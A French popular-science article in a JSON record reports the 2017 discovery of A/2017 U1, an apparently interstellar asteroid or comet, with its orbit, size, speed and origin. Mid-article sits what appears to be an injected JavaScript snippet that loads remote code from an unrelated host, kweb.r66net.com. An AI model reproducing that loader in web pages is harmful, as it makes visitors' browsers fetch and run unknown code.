{"title": "Découverte d’un étrange astéroïde qui pourrait venir d’une autre étoile", "newspaper": "Futura Sciences", "author": "Xavier Demeersman", "date_publi": "27/10/2017", "content": "Les premières observations d'un petit corps céleste qui vient d'être découvert suggèrent qu'il vient de l'espace interstellaire. Si cela se confirme, ce serait le premier cas connu d'une comète ou d'un astéroïde venu d'ailleurs. Mais d'où ? Ce qu'il faut retenir C/2017 U1, d'abord considérée comme une comète, a été découverte le 18 octobre par les télescopes du sondage PanSTARRS 1, à Hawaï. Sa plus petite distance avec la Terre était le 14 octobre. Sa trajectoire hyperbolique suggère qu’elle ne viendrait pas de notre Système solaire mais de l’espace interstellaire. Si les observations le confirment, A/2017 U1 ou C/2017 U1, astéroïde ou comète, serait le premier corps identifié comme venu d’ailleurs. Chaque semaine, de  nouvelles comètes  sont découvertes alors qu'elles s'approchent ou entrent dans le  Système solaire  interne. Petits corps célestes glacés plus ou moins lumineux, selon l'activité de leur noyau réchauffé par le  Soleil , elles ont beaucoup à nous dire sur les  origines de notre Système solaire . La plupart viennent des régions les plus éloignées de notre  étoile , au-delà de  Neptune , à des dizaines ou des centaines de milliards de kilomètres. Certaines déboulent pour la première fois dans la région où gravitent les planètes les plus proches du Soleil (les quatre  planètes telluriques ). Tandis que d'autres, à courte période, par exemple Halley ou  Tchouri , sont des habituées. Mais le 18 octobre, des astronomes ont repéré dans les sondages réalisés par les  télescopes PanSTARRS 1  installés sur l'Haleakala, à Hawaï, un étrange visiteur à quelque 37 millions de kilomètres du Soleil. D'abord baptisé  C/2017 U1 , l'objet vient d'être requalifié en  A/2017 U1 , suggérant une nature d' astéroïde  plutôt que de  comète . En tout cas, l' astre  paraît très pressé et surtout, et c'est plutôt inhabituel, sa trajectoire montre une extrême  excentricité  hyperbolique (1,19). Aussi, et si d'autres observations ultérieures le confirment,  « cet objet pourrait être le premier cas évident d'une comète interstellaire » , a déclaré à Sky&Telescope Gareth Williams, qui codirige le MPC ( International Astronomical Union's Minor Planet Center ), centre qui engrange les données des petits corps célestes. En jaune, la trajectoire de l'objet C/2017 U1 renommé A/2017 U1. Son orbite est inclinée à 122° par rapport au plan de l’écliptique. Son excentricité hyperbolique est de 1,19. © Nasa, JPL, Horizons                               D’où vient cette comète ou cet astéroïde apparemment interstellaire ? L'astre est très pâle ( magnitude  20). De premiers calculs basés sur sa  luminosité  estiment pour l'instant sa taille à 160 m. Assez petit, il a malgré tout survécu à la  chaleur  du Soleil lorsqu'il était au plus près de lui, en septembre. C'est une des raisons pour lesquelles les chercheurs s'orientent sur la piste d'un astéroïde plutôt qu'une comète. Le supposé visiteur  interstellaire  file assez vite, à quelque 26 km/s. Si c'est une comète,  « elle n'a peut-être pas eu le temps de se réchauffer suffisamment pour se briser » , suggère Bill  Gray , un dynamicien qui s'intéresse à elle.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  A/2017 U1 est passé dans le voisinage de la  Terre , le 14 octobre dernier, à environ 24 millions de kilomètres. Et nous ne sommes pas prêts de le revoir, car il se dirige vers l'espace interstellaire... Où sera-t-il dans un million d'années ? À une quinzaine d' années-lumière ..., et peut-être rendra-t-il visite à d'autres étoiles. Voir aussi : Comète, météorite, astéroïde, étoile filante : quelle est la différence ? Évidemment, cet astéroïde (ou comète) venu d'ailleurs aurait beaucoup de choses à nous raconter. Cela suscite beaucoup de questions : quelle est sa composition ?, est-il similaire à nos astéroïdes ?, a-t-il visité d'autres étoiles ?, quelle est son étoile d'origine ?, etc. Pour l'instant, tout ce que peuvent dire les astronomes qui l'étudient est qu'il vient de la direction de  Véga  (mais pas exactement), l'étoile la plus brillante de la  constellation  de la Lyre.  « C'est exactement ce qu'on peut attendre [notre Système solaire se déplace dans la  Voie lactée , en direction des étoiles de la Lyre,  NDLR ]. Il devrait y avoir davantage de comètes interstellaires venant de la direction vers laquelle le Soleil se dirige » , explique Luke Dones, du  Southwest Research Institute  (SwRI) à Boulder, dans le Colorado. Dans le passé, la seule autre comète soupçonnée de venir d'ailleurs était C/1980 E1 Bowell. Mais son excentricité (1,05) a pu être provoquée en cours de route par son passage à 35 millions de kilomètres de  Jupiter . Peut-être en a-t-il été de même pour C/2017 U1 ? Les chercheurs ne l'excluent pas. L'enquête est en cours et nous devrions en savoir plus sur son histoire dans les semaines à venir. La comète Tchouri en images                       L’épopée de Rosetta autour de la comète Tchouri en 210 images. Revivez les grands moments de cette mission historique de l'ESA qui a vu une sonde espionner une comète durant plus de deux ans et le robot Philae se poser à sa surface.                                       Vous avez aimé cet article ? N'hésitez pas à le partager avec vos ami(e)s et aidez-nous à faire connaître Futura :) ! La Rédaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest À voir aussi :  decouverte etrange  |  pourrait prevoir reveille reveil des volcan  |  500 ne pouvez pas venir ici  |  televisions venir  |  cometes venir  |  truc etrange  |  oiseau etrange  |  phenomene etrange  |  etrange disparition", "theme": "sciences"}